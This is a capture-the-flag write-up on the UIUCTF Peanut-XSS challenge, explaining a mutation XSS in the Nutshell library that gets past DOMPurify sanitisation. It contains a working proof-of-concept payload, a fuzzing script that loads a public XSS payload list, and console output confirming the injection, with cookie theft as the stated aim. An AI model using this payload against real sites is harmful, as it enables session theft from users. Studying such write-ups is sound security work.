# Peanut-XSS 

Peanut-XSS from UIUCTF included a 0day in [Nutshell](https://github.com/ncase/nutshell). Just like any other client-side challenge, the goal was to trigger an XSS and steal **document.cookie** from the admin. 

Nutshell uses the open-source libraries DOMPurify & Marked. But ofcourse, the goal was not to find a bypass in DOMPurify, rather it was something realted to how Peanut was handling the user input. 

```js
 <script
      src="https://cdn.jsdelivr.net/gh/ncase/nutshell@v1.0.06/nutshell.js"
      integrity="sha512-M2fB+hjUmLSY45qhwo1jQlOHhkxVJEGbWfHtJBV4WtKGS6KN2LsWLINTYkQZHlSqU5NUHBUw8Vl2tUJK2OwKDA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
 ></script>
 ```

It was also clear that this is a 0day since it was using the latest version. 

I was focusing on **DOM-Clobbering**, spent a lot of time doing so (I believe others did too) trying to find something that was being controlled from the user side, without success. 


# Finding the 0day

The code has a built-in features where it converts an **anchor** innerText to a **span** tag pointing to another built-in class **nutshell-expandable-text** using  ```let linkText = document.createElement('span') ```

 ```js
      expandables.forEach((ex)=>{
            // Style: closed Expandable
            ex.classList.add('nutshell-expandable');
            ex.setAttribute("mode", "closed");
            // Remove colon, replace with animated balls
            let linkText = document.createElement('span');
            linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(':')+1);
            linkText.className = 'nutshell-expandable-text';
            let ballUp = document.createElement('span');
            ballUp.className = 'nutshell-ball-up';
            let ballDown = document.createElement('span');
            ballDown.className = 'nutshell-ball-down';
            ex.innerHTML = '';
            ex.appendChild(linkText);
            ex.appendChild(ballUp);
            ex.appendChild(ballDown);
 ```

It then inserts the innerText into **linkText.innerHTML**, which makes room for possible injection. One issue though: **DOMPurify**, I started playing around, fuzzing etc.. 

# Hunting for Easy Wins

While exploring this, I made a script to fuzz common XSS payloads, while testing the logic manually

 ```js
function sanitizeHTML(payload) {
  const sanitizedPayload = DOMPurify.sanitize(payload);
  return sanitizedPayload;
}

fetch('https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt')
  .then(response => response.text())
  .then(payloads => {
    const payloadArray = payloads.split('\n');

    payloadArray.forEach((payload, index) => {
     
      const modifiedPayload = '<a href="xx">:' + payload + '</a>';
      const sanitizedPayload = sanitizeHTML(modifiedPayload);
      setTimeout(() => {
         console.log("trying: " + payload);
        document.body.innerHTML = sanitizedPayload;
      }, 500 * index); 
    });
  })
  .catch(error => console.error('Error fetching the XSS payload list:', error));
 ```

Which came back with nothing interesting. 

# Mutation XSS 


Peanut is a case where expressions and HTML are parsed and modified (into <span>), leading to DOM modification. As a result, filtered reflected input that goes through an HTML filter has the potential to transform into mXSS. 

Since mXSS is very common when DOMPurify is present, I've [found](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss) a very cool article that is similar to the case. 


## PoC 

```html
<a href="xss">:"&lt;img src=1 onerror=alert(1)&gt;"></a>
```

The above payload actually works, again this wasn't a bypass against DOMPurify but was an issue of how Peanut hadnled the user input. 

We can actually confirm that via dev-tools: 


```js

> DOMPurify.sanitize('<a href="xss">:"&lt;img src=1 onerror=alert(1)&gt;"></a>');
'<a href="xss">:"&lt;img src=1 onerror=alert(1)&gt;"&gt;</a>'
> const xss = document.getElementsByClassName("nutshell-expandable-text");
undefined
> xss[0]
<span class="nutshell-expandable-text">Nutshell</span>
> xss[1]
<span class="nutshell-expandable-text">"""<img src="1" onerror="alert(1)">"">"</span>
```

Crafting a **fetch**, we've got the flag! 
